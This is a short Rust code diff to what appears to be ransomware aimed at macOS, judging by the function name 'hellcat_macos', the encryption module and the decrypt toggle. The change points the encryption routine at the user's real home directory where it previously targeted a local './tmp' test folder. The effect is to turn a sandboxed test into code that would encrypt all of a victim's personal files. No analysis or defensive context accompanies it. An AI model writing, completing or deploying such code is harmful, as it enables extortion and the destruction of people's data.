@@ -1,11 +1,15 @@
+use dirs;
+
 // import encyrption module in ./encryption/enc.rs
 use crate::encryption::enc::{self};
 
+
 pub async fn hellcat_macos() {
     // get the home directory
-    let home = "./tmp";
+    let home = dirs::home_dir().unwrap();
+    let home_str = home.to_str().unwrap();
 
-    println!("Home {}", home);
+    println!("Home {}", home_str);
 
     // get the args
     let mut decrypt:bool = false;
@@ -17,6 +21,5 @@ pub async fn hellcat_macos() {
         }
     }
 
-    // start encryption
-    enc::encryption(home, decrypt);
+    enc::encryption(home_str, decrypt);
 }
